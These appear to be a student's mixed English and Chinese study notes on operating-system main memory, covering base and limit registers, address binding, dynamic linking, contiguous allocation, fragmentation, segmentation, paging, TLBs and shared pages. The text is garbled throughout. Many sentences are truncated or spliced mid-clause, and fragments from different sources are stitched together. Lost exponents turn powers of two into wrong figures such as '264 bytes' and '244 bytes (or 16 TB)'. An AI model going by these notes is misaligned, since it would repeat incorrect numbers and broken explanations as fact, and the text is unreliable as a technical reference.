迟，累积起来就使得内存比寄存器慢得多。 为了缓解寄存器与内存之间的巨大速度差异，硬件设计师 做出了许多努力，包括在CPU内部设置缓存、优化CPU
 工作方式，尽量一次性从内存读取指令所要用到的全部数
      据等等。
(完)
9.1.1 Basic Hardware
Main memory and the registers 寄存器(built into each processing core) are the only general-purpose storage that the CPU can access directly.
There are machine instructions that take memory addresses as arguments, but none that take disk addresses.
Therefore, any instructions in execution, and any data being used by the instructions, must be in one of these direct- access storage devices.
If the data are not in memory, they must be moved to memory before CPU can operate on them.
Registers:
built into each CPU core are generally accessible within one
cycle of the CPU clock.
Some CPU cores can decode instructions and perform simple operations on register contents, at the rate of one or more operations per clock tick. The same cannot be said of main memory, which is accessed via a transaction on the memory bus.
Completing a memory access may take many cycles of the CPU clock.
  - In such cases, the processor normally needs to stall, since it does not have the data required to complete the instruction that it is executing.
  - This is intolerable because of the frequency of memory-accesses.
  - The remedy is to add fast memory between the CPU and main memory, typically on the CPU chip for fast access.
  - Such a cache was described in Section 1.5.5.
  - To manage a cache built into the CPU, the hardware automatically speeds up memory access without any operating-system control. (Recall from Section 5.5.2 that during a memory stall, a multithreaded core can switch from the stalled hardware thread to another hardware thread.)
Not only are we concerned with the relative speed of accessing physical memory, but we also must ensure correct operation.
For proper system operation, we must protect the operating system from access by user processes, like protect user processes from one another. be provided by the hardware, because the operating system doesn’t usually intervene between the CPU and its memory accesses (because of the resulting performance penalty).
Hardware implements this production in several different ways.
one possible implementation.
  - 1. make sure each process has a separate memory
space.
  - separate memory space:
  - protects the processes from each other
  - is fundamental to have multiple processes
loaded in memory for concurrent execution.
  - To separate memory spaces, we need:
  - determine the range of legal addresses the process access
  - ensure that the process can access only these legal addresses.
  - provide this protection by 2 registers, usually a base and a limit:
  - base register: holds the smallest legal physical memory address;
  - limit register: specifies the size of the range.
  - example: the base register holds 300040 and the ⁃
limit register is 120900, then the program can legally access all addresses from 300040 through 420939 (inclusive).
 Protection of memory space is accomplished by having the CPU hardware compare every address (generated in user mode with the registers).
Any attempt by a program executing in user mode to access operating-system memory / other users’ memory
results in a trap to the operating system, treats the attempt as a fatal error.  This scheme prevents a user program from (accidentally or deliberately) modifying the code / data structures of the operating system / other users.
The base and limit registers can be loaded only by the operating system, uses a special privileged instruction.
only the operating system can load the base and limit registers. only the operating system executes in kernel mode,
privileged instructions can be executed only in kernel mode,
So, only operating system can change the value of the registers, no user programs can change the registers’ contents. The operating system, executing in kernel mode, has unrestricted access to operating-system memory / users’ memory.
allows the operating system to load users’ programs into users’ memory,
to dump out those programs in case of errors,
to access and modify parameters of system calls, to perform I/O to and from user memory,
to provide many other services.
Example:
  - an operating system for a multiprocessing system must execute context switches:
  - storing the state of one process from the registers into main memory
  - before loading the next process’s context from main memory into the registers. 9.1.2 Address Binding
Usually, a program resides on a disk as a binary executable file.
To run, the program must be brought into memory and placed within the context of a process, where it becomes eligible for execution on an available CPU.
As the process executes, it accesses instructions and data from memory.
Eventually, the process terminates, and its memory is reclaimed for use by other processes.
Most systems allow a user process to reside in any part of the physical memory.
the address space of the computer may start at 00000 the first address of the user process need not be 00000.
In most cases, a user program goes through several steps before being executed (some of which may be optional).
Addresses may be represented in different ways during these steps. count).
Compiler: typically binds symbolic addresses to relocatable addresses (like “14 bytes from the beginning of this module”).
linker / loader: binds the relocatable addresses to absolute addresses (such as 74014).
Each binding is a mapping from one address space to another.
The binding of instructions / data to memory addresses can be done at any step along the way:
Compile time: If you know where the process will reside in memory, then absoulute code can be generated.
  - Example, if you know that a user process will reside starting at location R, then the generated compiler code will start at that location and extend up from there.
  - If later the starting location changes, then it need to recompile this code.
Load time. If not know where the process will reside in memory, then the compiler must generate relocatable code. In this case, binding until load time.
  - If the starting address changes, we need only reload the user code to incorporate this changed value. execution from one memory segment to another, then binding until run time.
  - Special hardware must be available for this scheme to work.
  - Most operating systems use this method.
A major portion of this chapter is devoted to showing how these various bindings can be implemented effectively in a computer system and to discussing appropriate hardware support. Logical Versus Physical Address Space
- Logical/virtual address: address generated by the CPU
- physical address: address seen by the memory unit, the one
loaded into the memory-address register of the memory. Binding addresses at compile / load time generates identical
logical and physical addresses.
However, the execution-time address-binding scheme results in differing logical and physical addresses.
- The set of all logical addresses generated by a program is logical address space.
- The set of all physical addresses corresponding to these logical addresses is physical address space.
- Thus, in the execution-time address-binding scheme, the logical and physical address spaces differ.  The run-time mapping from virtual to physical addresses is done by a hardware device, memory-management unit (MMU)
We can choose from many different methods to accomplish such mapping.
- mapping with a simple MMU scheme that is a generalization of the base-register scheme.
- The base register is now called a relocation register.
- The value in the relocation register is added to every address generated by a user process at the time the address is sent to memory.  The user program never accesses the real physical addresses.
- The program can create a pointer to location 346, store it in memory, manipulate it, and compare it with other addresses —all as the number 346. Only when it is used as a memory address (in an indirect load or store, perhaps) is it relocated relative to the base register.
The user program deals with logical addresses.
- The memory-mapping hardware converts logical addresses location of a referenced memory address is not determined until the reference is made.
The user program generates only logical addresses and thinks that the process runs in memory locations from 0 to max.
- However, these logical addresses must be mapped to physical addresses before they are used.
- How logical address space is bound to a separate physical address space is central to proper memory management.
9.1.4 Dynamic Loading
It is necessary for the entire program and all data of a process to be in physical memory for the process to execute.
The size of a process <= the size of physical memory.
Dynamic Loading: better memory-space utilization
a routine is not loaded until it is called.
All routines are kept on disk in a relocatable load format. The main program is loaded into memory and is executed. When a routine needs to call another routine, the calling routine first checks to see whether the other routine has been loaded.
If it has not, the relocatable linking loader is called to load the desired routine into memory and to update the program’s address tables to reflect this change.
Then control is passed to the newly loaded routine.
Advantage: routine is loaded only when it is needed.
particularly useful when large amounts of code are needed to handle infrequently occurring cases, such as error routines.
although the total program size is large, the portion that is used (and hence loaded) may be much smaller.
Dynamic loading does not require special support from the operating system.
It is the responsibility of the users to design their programs to take advantage of such a method.
Operating systems may help the programmer by providing library routines to implement dynamic loading.
9.1.5 Dynamic Linking and Shared Libraries Dynamic Linked Libraries (DLLs) are system libraries that are linked to user programs when the programs are run.
static linking: Some operating systems support only static linking, in which system libraries are treated like any other object module and are combined by the loader into the binary program image.
Dynamic linking:
similar to dynamic loading, linking is postponed until execution time. This feature is usually used with system libraries, like the standard C language library.
  - Without this facility, each program on a system must include a copy of its language library (or at least the routines referenced by the program) in the executable image. This requirement increases the size of an executable image, may waste the main memory.
A second advantage: these libraries can be shared among multiple processes, so that only one instance of the DLL in main memory. For this reason, DLLs are also known as shared libraries, and are used extensively in Windows and Linux systems.
  - When a program references a routine that is in a dynamic library, necessary.
  - It then adjusts addresses that reference functions in the dynamic library to the location in memory where the DLL is stored.
Dynamically linked libraries can be extended to library updates (like bug fixes) or be replaced by a new version, and all programs that reference the library will automatically use the new version.
  - Without dynamic linking, all such programs would need to be relinked to gain access to the new library. So the programs will not accidentally execute new, incompatible versions of libraries, version information is included in both the program and the library.
  - More than one version of a library may be loaded into memory, and each program uses its version information to decide which copy of the library to use.
  - Versions with minor changes retain the same version number, whereas versions with major changes increment the number.
  - Thus, only programs that are compiled with the new library version are affected by any incompatible changes incorporated in it. Other programs linked before the new library was installed will continue using the older library. generally require help from the operating system.
If the processes in memory are protected from one another
the operating system is the only entity that can check to see
whether the needed routine is in another process’s memory space
whether can allow multiple processes to access the same memory addresses.
how DLLs can be shared by multiple processes - Section 9.3.4.
動態(Dynamic Linking)與靜態連結
(Static Linking)
Static Linking: 在開發階段將程式所需要的函數、資源等全部 加入程式的執行檔，執行檔的體積因此變大，所以靜態連 結的執行檔往往需要較大的記憶體空間，當所用的函式庫 越多時，執行檔也就越龐大。
Dynamic Linking: 函式會在程式執行時才被載入，而不是直接 編譯在執行檔中，這種作法讓系統更彈性的應用硬體資 源，而且可以不公開程式碼的情況分享給別人使用。
由於Static Linking是把整個Library包進去執行檔，因此可以保 證到不同機器環境下執行時，也不會因為少了這個函式庫導致 無法執行檔案，但其缺點是檔案會比較大 Dynamic Linking是在程式開始執行時才載入的，所以執行檔較 小，而且更新程式庫無需重新編譯其他程式
兩者各有優缺點，以實際需求來選擇編譯的方式，當檔案共用 多個函式庫，可採用Dynamic Linking，反之就建議採用Static Linking。
可以由檔名末端來判斷是否使用動態連結，在微軟的作業系統 上，.dll即為Dynamic Linking，在蘋果上，Dynamic Linking 為.dylib，Static Linking為.a。
9.2 Contiguous Memory Allocation
The Main memory must accommodate both OS and various user processes.
Limited resource, need to allocate main memory in most efficient way.
Contiguous memory allocation: one early method The memory is usually divided into 2 partitions:
one for the operating system.   - Can be placed in either low or high memory addresses.
  - decision depends on many factors, like the location of
the interrupt vector.
  - Most operating systems (Linux, Windows) place the
OS in high memory. (we discuss only this situation)
  - Resident operating system, usually held in low
memory with interrupt vector
one for the user processes.
  - User processes usually held in high memory.
  - several user processes reside in memory at the same
time.
  - how to allocate available memory to the processes that
are waiting to be brought into memory.
  - Contiguous memory allocation: each process is contained in a single section of memory that is contiguous to the section of next process.
9.2.1 Memory Protection  A system with a relocation register and a limit register: relocation register: the smallest physical address;
  - Prevent a process from accessing memory that it does not own.
  - Prevent a process changing operating-system code and data
Base register contains value of smallest physical address limit register: the range of logical addresses (example,
relocation = 100040 and limit = 74600).
Each logical address must fall within the range specified by the limit register. value in the relocation register. This mapped address is sent to memory.
Can then allow actions such as kernel code being transient and kernel changing size
Contiguous memory allocation does not allow processes to share code, since a process’s virtual memorty segment is not breoken into non-contiguous fine grained segments.
When the CPU scheduler selects a process for execution, the dispatcher loads the relocation and limit registers with the correct values as part of the context switch.
As every address generated by a CPU is checked against these registers, we can protect both the OS and the other users’ programs and data from being modified by this running process.
The relocation-register scheme provides an effective way to allow the operating system’s size to change dynamically. This flexibility is desirable in many situations.
example, the operating system contains code and buffer space for device drivers.
device driver can be loaded into memory only when it is needed. When it is no longer needed, it can be removed and its memory allocated for other needs. 536CN4 chapter 9.2.2 Memory Allocation
Memory allocation: Multiple-partition allocation:
One of the simplest methods: variable-partition scheme Degree of multiprogramming limited by number of partitions
Initially, all memory is available for user processes   - one large block of available memory (hole).
When a process arrives, it is allocated memory from a hole large enough to accommodate it
Then, memory comes a set of contiguos holes of various sizes, scattered 分散的 throughout memory / partitions.
  - the OS keeps a table: which parts of memory are available and which are occupied.
   - a) allocated partitions
  - b) free partitions (hole)
As processes enter the system, the OS searches the set for a
hole:
  - the memory requirements of process VS amount of available memory space, determine which processes are allocated memory.
When a process is allocated space: it is loaded into memory, where it can then compete for CPU time.
  - When process terminates, it releases its block of memory, placed back in the set of holes.
If the hole is too large, it split. One part is allocated to the arriving process; the other is returned to the set of holes.
  - If the new hole is adjacent to other holes, these adjacent holes are merged to form one larger hole.
No sufficient memory for an arriving process:
  - simply reject the process and provide an appropriate
error message.
  - place such processes into a wait queue. When memory is later released, the OS checks the wait queue to determine if it will satisfy the memory demands of a waiting process. request of size n from a list of available free holes.
first-fit strategies: Allocate the first hole that is big enough.
  - Searching start the beginning of the set of holes or after the previous first-fit search ended.
  - Stop as soon as find a free hole that is large enough. best-fit strategies. Allocate the smallest hole that is big
enough.
  - must search the entire list (unless the list is ordered by
size).
  - Left the smallest leftover hole,
worst-fit strategies. Allocate the largest hole.
  - must search the entire list (unless the list is ordered by
size).
  - Left the largest leftover hole (may be more useful than the smaller leftover hole from a best-fit approach)
Simulations have shown that both first fit and best fit are better than worst fit in terms of decreasing time and storage utilization.
Neither first fit nor best fit is clearly better than the other in terms of storage utilization, but first fit is generally faster.
536CN4 chapter 9.2.3 Fragmentation External fragmentation: enough total memory space but the spaces are not contiguous: storage is fragmented into a large number of small holes.
Both the first-fit and best-fit strategies for memory allocation suffer from external fragmentation, the free memory space is broken into little pieces.
This fragmentation problem can be severe. In the worst case, we could have a block of free (or wasted) memory between every two processes. If all these small pieces of memory were in one big free block instead, we might be able to run several more processes.
Whether we are using the first-fit / best-fit strategy can affect the amount of fragmentation. (First fit is better for some systems, whereas best fit is better for others.) Another factor is which end of a free block is allocated. (Which is the leftover piece—the one on the top or the one on the bottom?) No matter which algorithm is used, however, external fragmentation will be a problem.
50-percent rule: Depending on the total amount of memory storage and the average process size, external fragmentation may be a minor or major problem. Statistical analysis of first fit, reveals that, even after optimization, given N allocated blocks, another 0.5 N blocks will be lost to fragmentation. That is, one- third of memory may be unusable! partition.
Consider a multiple-partition allocation scheme with a hole of 18,464 bytes. Suppose that the next process requests 18,462 bytes. If we allocate exactly the requested
block, we are left with a hole of 2 bytes. The overhead to keep track of this hole will be substantially larger than the hole itself.
Solution:
General solution for internal fragmentation:
break the physical memory into fixed-sized blocks, allocate
memory in units based on block size.
With this approach, the memory allocated to a process may be slightly larger than the requested memory.
Solution for external fragmentation:
Compaction 压紧: shuffle the memory contents to place all free
memory together in one large block.
not always possible, If relocation is static and is done at
assembly or load time, compaction cannot be done.
possible only if relocation is dynamic and is done at execution time. If addresses are relocated dynamically, relocation requires only moving the program and data and then changing the base register to reflect the new base address.
Determine its cost. The simplest compaction algorithm: move all processes toward one end, all holes move in the other direction, producing one large hole of available memory. This scheme can be expensive.
permit the logical address space of processes to be noncontiguous: allowing a process to be allocated physical memory wherever such memory is available.
The strategy used in paging, the most common memory- management technique for computer systems.
Segmentation
  Memory-management scheme that supports user view of memory
  A program is a collection of segments   A segment is a logical unit such as:
main program procedure function method object
local variables, global variables common block
stack
symbol table
Arrays
User’s View of a Program  Logical View of Segmentation  Segmentation Architecture
  Logical address consists of a two tuple 元组: <segment-number, offset>,
  Segment table – maps two-dimensional physical addresses; each table entry has:
base – the starting physical address where the segments reside in memory
limit – specifies the length of the segment Segment-table base register (STBR) points to the
segment table’s location in memory
Segment-table length register (STLR) indicates number of segments used by a program;
  - segment number s is legal if s < STLR
Segmentation Architecture (Cont.)
  Protection
  With each entry in segment table associate:
  validation bit = 0 ⇒ illegal segment   read/write/execute privileges
  Protection bits associated with segments; code sharing occurs at segment level
  Since segments vary in length, memory allocation is a dynamic storage-allocation problem
  A segmentation example is shown in the following diagram.         pure segmentation also suffers from the external fragmentation because a segment of a process is laid out contiguously in physical memory and it is possible that when a dead processes are replaced by new processes, fragmentation occurs.
pure segmentation, however, enables processes to share code; for instance, 2 different proecsses could share a code segment but have distinct data segments,        memory layout and architecture.
- Processes on your system don't have access to physical memory directly.
  - They each have their own representation of memory, virtual memory.
  - Each has their own virtual address space, process address space. - Both the virtual and the physical address spaces are broken up into pages
  - the unit of allocation for both physical and virtual memory.
pages
- A page in the virtual address space can map back to a page in physical memory or other storage like hard disk.
- This indirection allows us to use a memory management technique called swapping.
- virtual address space or virtual memory is that we can move a page from physical memory to another location like a hard disk based
 on its usage. - swap out
  - If it's not used in a very long period of time
  - take a memory page, write out the disk and reuse the physical
memory for another application.
  - time-based paging. when swap out based on time
  - From the perspective of the process, the virtual memory address never changes,
  - but the physical address that it maps back to is updated from the physical memory address
  - and memory now back to the blocks on disk that we wrote the page to.
  - demand paging.
  - Another way pages get swapped out is if there's a
demand for more memory from other applications on the system and don't have enough free pages to allocate to those new allocations.
  - The memory manager will start writing out pages to disk and freeing up the physical memory for the processes that need it
  - it will start with the oldest pages
  - sometimes those pages aren't that old and if that's the
case, we may be under memory pressure, low on
physical memory
  - In both, the virtual memory address doesn't change,
  - the physical address does, it goes from the physical memory address to an address on disk.
  - The process doesn't know that it moved at all.
  - The memory manager manages this transition.
- page fault
  - if a process tries to access a page that's been swapped out the
disk
- swap in
  - The memory manager pull the page from disk and place it into physical memory
  - and update the pointer for the virtual memory address from
the disk location to the new location in physical memory - excessive swapping.
  - constantly swapping in and swapping out the same chunks of memory for processes,
  - that indicate that don't have a sufficient amount of memory in our system.
  - will put pressure on your disk subsystem and slow everything down
  - constantly trading physical pages with pages written out the disk.
 - disk subsystem is literally the slowest thing in your computer.
- You can tune the amount of swapping your system does by
adjusting the swappiness of a process.
So what to look out for memory?
- First and foremost, who are the large consumers,
- are their processes consuming a large amount of physical memory, - are their processes consuming a large amount of virtual memory. - who's swapping in and who's swapping out excessively.
file system cache
- the hard disk is the slowest thing in your computer
- so Linux will take leftover main memory in your system and store frequently accessed files and directories in memory to facilitate faster I/O response times in your applications.
- This is a great feature and dramatically increases the overall usability of your system. Paging
the physical address space of a process better to be contiguous.
Paging:
- a memory-management scheme
- process’s physical address space can be non-contiguous.
- avoids external fragmentation and the associated need for compaction.
- Avoids problem of varying sized memory chunks
  - two problems that plague contiguous memory
allocation.
- offers numerous advantages, used in most OS, from servers to mobile devices.
- Paging is implemented through cooperation between the operating system and hardware.
Basic Method Implementing paging:
breaking physical memory into fixed-sized blocks called
frames.
  - Size is power of 2, between 512 bytes and 16 Mbytes
breaking logical memory into same size blocks called pages.
When a process is to be executed, its pages are loaded into any available memory frames from their source (a file system or the backing store).
The backing store is divided into fixed-sized blocks that are the same size as the memory frames or clusters of multiple frames.
This rather simple idea has great functionality and wide ramifications.
example, the logical address space is now totally separate from the physical address space, so a process can have a logical 64-bit address space even though the system has less than
264 bytes of physical memory.  Every address generated by the CPU is divided into two parts: a page number(p) and a page offset (d):
Set up a page table to translate logical to physical addresses
page table: contains the base address of each frame in physical memory
d: offset is the location in the frame being referenced.
The physical memory address: combined the base address of
the frame and the page offset.  Steps taken by the MMU: to translate a logical address generated by the CPU to a physical address:
1. Extract the page number p and use it as an index into the page table.
2. Extract the corresponding frame number f from the page table. 3. Replace the page number p in the logical address with the frame number f.
As the offset d does not change, it is not replaced, and the frame number and offset now comprise the physical address.
The page size (like the frame size) is
  - defined by the hardware (power of 2), typically 4 KB to 1 GB per page, depending on the computer architecture.
  - power of 2 makes the translation of a logical address into a page number and page offset particularly easy.
  - If the size of the logical address space is 2m, and a page size is 2n bytes:
  - page number: high-order m−n bits of a logical address
  - page offset: n low-order bits designate
  - the logical address is as follows: p is an index into the page table and d is the displacement within the page.
⁃
  Example:
logical address: logical address space is 24.
n = 2 and m = 4.
Using a page size of 4 bytes and a physical memory of 32 bytes (8 pages) physical address = frame x 4 + offset
Logical address 0 (page 0, offset 0). page table: page 0 is in frame 5.
  - logical address 0, physical address 20 [(5 × 4) + 0].
  - Logical address 3 (page 0, offset 3), physical address
23 [(5 × 4) + 3].
Logical address 4 (page 1, offset 0), page 1 is mapped to frame 6.
  - logical address 4, physical address 24 [= (6 × 4) + 0].
  - Logical address 13, physical address 9.
Using paging is similar to using a table of base (or relocation) registers, one for each frame of memory.
paging scheme, no external fragmentation,
but still internal fragmentation.
frames are allocated as units. If the memory requirements of a process do not happen to coincide with page boundaries, the last frame allocated may not be completely full.
example, if page size is 2,048 bytes, a process of 72,766 bytes will need 35 pages plus 1,086 bytes. It will be allocated 36 frames, resulting in internal fragmentation of 2,048 − 1,086 = 962 bytes. entire frame empty.
If process size is independent of page size, we expect internal fragmentation to average one-half page per process. This consideration suggests that small page sizes are desirable. However, overhead is involved in each pagetable entry, and this overhead is reduced as the size of the pages increases. Also, disk I/O is more efficient when the amount of data being transferred is larger. Generally, page sizes have grown over time as processes, data sets, and main memory have become larger.
Today, pages typically 4 KB or 8 KB in size.
Some CPUs and OS even support larger or multiple page sizes.
  - x86-64 systems, Windows 10 supports page sizes of 4 KB and 2 MB.
  - Linux supports 2 page sizes: default page size (typically 4 KB) and an architecture-dependent larger page size, huge pages.
OBTAINING THE PAGE SIZE ON LINUX SYSTEMS
On a Linux system, the page size varies according to architecture, and there are several ways of obtaining the page size.
use the system call getpagesize().
enter the command line: getconf PAGESIZE
Each of these techniques returns the page size as a number
 of bytes.
Frequently, on a 32-bit CPU, each page-table entry is 4 bytes long, but that size can vary as well. A 32-bit entry can point to
one of 232 physical page frames. If the frame size is 4 KB (212),
then a system with 4-byte entries can address 244 bytes (or 16 TB) of physical memory. We should note here that the size of physical memory in a paged memory system is typically different from the maximum logical size of a process. As we further explore paging, we will introduce other information that must be kept in the page-table entries. That information reduces the number of bits available to address page frames. Thus, a system with 32-bit page-table entries may address less physical memory than the possible maximum.
When a process arrives in the system to be executed, its size, expressed in pages, is examined. Each page of the process needs one frame. Thus, if the process requires n pages, at least n frames must be available in memory. If n frames are available, they are allocated to this arriving process. The first page of the process is loaded into one of the allocated frames, and the frame number is put in the page table for this process. The next page is loaded into another frame, its frame number is put into the page table, and so on (Figure 9.11).
An important aspect of paging is the clear separation between the pro- grammer’s view of memory and the actual physical memory. The programmer views memory as one single space, containing only this one program. In fact, the user program is
 scattered throughout physical memory, which also holds other programs. The difference between the programmer’s view of memory and the actual physical memory is reconciled by the address-translation hard- ware. The logical addresses are translated into physical addresses. This map- ping is hidden from the programmer and is controlled by the operating system. Notice that the user process by definition is unable to access memory it does not own. It has no way of addressing memory outside of its page table, and the table includes only those pages that the process owns.
Since the operating system is managing physical memory, it must be aware of the allocation details of physical memory— which frames are allocated, which frames are available, how many total frames there are, and so on. This information is generally kept in a single, system-wide data structure called a frame table. The frame table has one entry for each physical page frame, indicating whether the latter is free or allocated and, if it is allocated, to which page of which process (or processes).
In addition, the operating system must be aware that user processes oper- ate in user space, and all logical addresses must be mapped to produce physical addresses. If a user makes a system call (to do I/O, example) and provides an address as a parameter (a buffer, for instance), that address must be mapped to produce the correct physical address. The operating system maintains a copy of the page table for each process, just as it maintains a copy of the instruction counter and register contents. This copy is used to translate logical addresses to physical addresses whenever the operating system must map a logical address to a physical address manually. It is also used by the CPU dispatcher to define the hardware page table when a process is to be allocated the CPU. Paging therefore increases the context-switch time.
9.3.2 Hardware Support
As page tables are per-process data structures, a pointer to the page table is stored with the other register values (like the instruction pointer) in the process control block of each process. When the CPU scheduler selects a process for execution, it must reload the user registers and the appropriate hardware page-table values from the stored user page table.
The hardware implementation of the page table can be done in several ways. In the simplest case, the page table is implemented as a set of dedicated high-speed hardware registers, which makes the page-address translation very efficient. However, this approach increases context-switch time, as each one of these registers must be exchanged during a context switch.
The use of registers for the page table is satisfactory if the page table is rea- sonably small (example, 256 entries). Most contemporary CPUs, however, support much larger page tables
(example, 220 entries). For these machines, the use of fast registers to implement the page table is not feasible. Rather, the page table is kept in main memory, and a page-table base register(PTBR) points to the page table. Changing page tables requires changing only this one register, substantially reducing context-switch time.
9.3.2.1 translation Look-Aside Buffer Although storing the page table in main memory can yield faster context switches, it may also result in slower memory access times. Suppose we want to access location i. We must first index into the page table, using the value in the PTBR offset by the page number for i. This task requires one memory access. It provides us with the frame number, which is combined with the page offset to produce the actual address. We can then access the desired place in memory. With this scheme, two memory accesses are needed to access data (one for the page-table entry and one for the actual data). Thus, memory access is slowed by a factor of 2, a delay that is considered intolerable under most circumstances.
The standard solution to this problem is to use a special, small, fast-lookup hardware cache called a trabslation look-aside buffer (TLB). The TLB is asso- ciative, high-speed memory. Each entry in the TLB consists of two parts: a key (or tag) and a value. When the associative memory is presented with an item, the item is compared with all keys simultaneously. If the item is found, the cor- responding value field is returned. The search is fast; a TLB lookup in modern hardware is part of the instruction pipeline, essentially adding no performance penalty. To be able to execute the search within a pipeline step, however, the TLB must be kept small. It is typically between 32 and 1,024 entries in size. Some CPUs implement separate instruction and data address TLBs. That can double the number of TLB entries available, because those lookups occur in different pipeline steps. We can see in this development an example of the evolution of CPU technology: systems have evolved from having no TLBs to having multiple levels of TLBs, just as they have multiple levels of caches. The TLB is used with page tables in the following way. The TLB contains only a few of the page-table entries. When a logical address is generated by the CPU, the MMU first checks if its page number is present in the TLB. If the page number is found, its frame number is immediately available and is used to access memory. As just mentioned, these steps are executed as part of the instruction pipeline within the CPU, adding no performance penalty compared with a system that does not implement paging.
If the page number is not in the TLB (known as a TLB miss), address translation proceeds following the steps illustrated in Section 9.3.1, where a memory reference to the page table must be made. When the frame number is obtained, we can use it to access memory (Figure 9.12). In addition, we add the page number and frame number to the TLB, so that they will be found quickly on the next reference.
If the TLB is already full of entries, an existing entry must be selected for replacement. Replacement policies range from least recently used (LRU) through round-robin to random. Some CPUs allow the operating system to par- ticipate in LRU entry replacement, while others handle the matter themselves. Furthermore, some TLBs allow certain entries to be wired down, meaning that they cannot be removed from the TLB. Typically, TLB entries for key kernel code are wired down.
Some TLBs store address-space identifier (ASIDs) in each TLB entry. An ASID uniquely identifies each process and is used to provide address-space protection for that process. When the TLB attempts to resolve virtual page num- bers, it ensures that the ASID for the currently running process matches the ASID associated with the virtual page. If the ASIDs do not match, the attempt is treated as a TLB miss. In addition to providing address-space protection, an ASID allows the TLB to contain entries for several different processes simulta- neously. If the TLB does not support separate ASIDs, then every time a new page table is selected (for instance, with each context switch), the TLB must be flushe (or erased) to ensure that the next executing process does not use the
wrong translation information. Otherwise, the TLB could include old entries that contain valid virtual addresses but have incorrect or invalid physical addresses left over from the previous process.
The percentage of times that the page number of interest is found in the TLB is called the hit ratio. An 80-percent hit ratio, example, means that we find the desired page number in the TLB 80 percent of the time. If it takes 10 nanoseconds to access memory, then a mapped-memory access takes 10 nanoseconds when the page number is in the TLB. If we fail to find the page number in the TLB then we must first access memory for the page table and frame number (10 nanoseconds) and then access the desired byte in memory (10 nanoseconds), for a total of 20 nanoseconds. (We are assuming that a page- table lookup takes only one memory access, but it can take more, as we shall see.) To find the effective memory-access time, we weight the case by its probability:
effective access time = 0.80 × 10 + 0.20 × 20 = 12 nanoseconds
In this example, we suffer a 20-percent slowdown in average memory-access time (from 10 to 12 nanoseconds). For a 99- percent hit ratio, which is much more realistic, we have
effective access time = 0.99 × 10 + 0.01 × 20 = 10.1 nanoseconds
This increased hit rate produces only a 1 percent slowdown in access time.
As noted earlier, CPUs today may provide multiple levels of TLBs. Calculat- ing memory access times in modern CPUs is therefore much more complicated than shown in the example above. For instance, the Intel Core i7 CPU has a 128-entry L1 instruction TLB and a 64-entry L1 data TLB. In the case of a miss at L1, it takes the CPU six cycles to check for the entry in the L2 512-entry TLB. A miss in L2 means that the CPU must either walk through the page-table entries in memory to find the associated frame address, which can take hundreds of cycles, or interrupt to the operating system to have it do the work.
A complete performance analysis of paging overhead in such a system would require miss-rate information about each TLB tier. We can see from the general information above, however, that hardware features can have a signif- icant effect on memory performance and that operating-system improvements (such as paging) can result in and, in turn, be affected by hardware changes (such as TLBs). We will further explore the impact of the hit ratio on the TLB in Chapter 10.
TLBs are a hardware feature and therefore would seem to be of little concern to operating systems and their designers. But the designer needs to understand the function and features of TLBs, which vary by hardware platform. For opti- mal operation, an operating-system design for a given platform must imple- ment paging according to the platform’s TLB design. Likewise, a change in the TLB design (example, between different generations of Intel CPUs) may necessitate a change in the paging implementation of the operating systems that use it.
9.3.3 Protection
Memory protection in a paged environment is accomplished by protection bits associated with each frame. Normally, these bits are kept in the page table.
One bit can define a page to be read–write or read-only. Every reference to memory goes through the page table to find the correct frame number. At the same time that the physical address is being computed, the protection bits can be checked to verify that no writes are being made to a read-only page. An attempt to write to a read-only page causes a hardware trap to the operating system (or memory-protection violation).
We can easily expand this approach to provide a finer level of protection. We can create hardware to provide read-only, read– write, or execute-only protection; or, by providing separate protection bits for each kind of access, we can allow any combination of these accesses. Illegal attempts will be trapped to the operating system.
One additional bit is generally attached to each entry in the page table: a valid-invalid bit. When this bit is set to valid, the associated page is in the process’s logical address space and is thus a legal (or valid) page. When the bit is set to invalid, the page is not in the process’s logical address space. Illegal addresses are trapped by use of the valid–invalid bit. The operating system sets this bit for each page to allow or disallow access to the page.
Suppose, example, that in a system with a 14-bit address space (0 to 16383), we have a program that should use only addresses 0 to 10468. Given a page size of 2 KB, we have the situation shown in Figure 9.13. Addresses in pages 0, 1, 2, 3, 4, and 5 are mapped normally through the page table. Any attempt to generate an address in pages 6 or 7, however, will find that the
valid–invalid bit is set to invalid, and the computer will trap to the operating system (invalid page reference).
Notice that this scheme has created a problem. Because the program extends only to address 10468, any reference beyond that address is illegal. However, references to page 5 are classified as valid, so accesses to addresses up to 12287 are valid. Only the addresses from 12288 to 16383 are invalid. This problem is a result of the 2-KB page size and reflects the internal fragmentation of paging.
Rarely does a process use all its address range. In fact, many processes use only a small fraction of the address space available to them. It would be wasteful in these cases to create a page table with entries for every page in the address range. Most of this table would be unused but would take up valuable memory space. Some systems provide hardware, in the form of a page-table length register (PTLR), to indicate the size of the page table. This value is checked against every logical address to verify that the address is in the valid range for the process. Failure of this test causes an error trap to the operating system. 9.3.4 Shared Pages
An advantage of paging is the possibility of sharing common code, a considera- tion that is particularly important in an environment with multiple processes. Consider the standard C library, which provides a portion of the system call interface for many versions of UNIX and Linux. On a typical Linux system, most user processes require the standard C library libc. One option is to have each process load its own copy of libc into its address space. If a system has 40 user processes, and the libc library is 2 MB, this would require 80 MB of memory.
If the code is reentrant code, however, it can be shared, as shown in Figure 9.14. Here, we see three processes sharing the pages for the standard C library libc. (Although the figure shows the libc library occupying four pages, in reality, it would occupy more.) Reentrant code is non-self-modifying code: it never changes during execution. Thus, two or more processes can execute the same code at the same time. Each process has its own copy of registers and data storage to hold the data for the process’s execution. The data for two different processes will, of course, be different. Only one copy of the standard C library need be kept in physical memory, and the page table for each user process maps onto the same physical copy of libc. Thus, to support 40 processes, we need only one copy of the library, and the total space now required is 2 MB instead of 80 MB—a significant saving!
In addition to run-time libraries such as libc, other heavily used programs can also be shared — compilers, window systems, database systems, and so on. The shared libraries discussed in Section 9.1.5 are typically implemented with shared pages. To be sharable, the code must be reentrant. The read-only nature of shared code should not be left to the correctness of the code; the operating system should enforce this property.
The sharing of memory among processes on a system is similar to the sharing of the address space of a task by threads, described in Chapter 4. Furthermore, recall that in Chapter 3 we described shared memory as a method of interprocess communication. Some operating systems implement shared memory using shared pages.
Organizing memory according to pages provides numerous benefits in addition to allowing several processes to share the same physical pages. We cover several other benefits in Chapter 10.
9.5 Swapping
536CN4 chapter 9: main memory
We discussed various memory-management strategies used in computer systems, the same goal:
to keep many processes in memory simultaneously to allow multiprogramming.
But, they tend to require the entire process be in memory to execute.
Virtual memory: allows the execution of processes that are not completely in memory.
One major advantage: programs can be larger than physical memory.
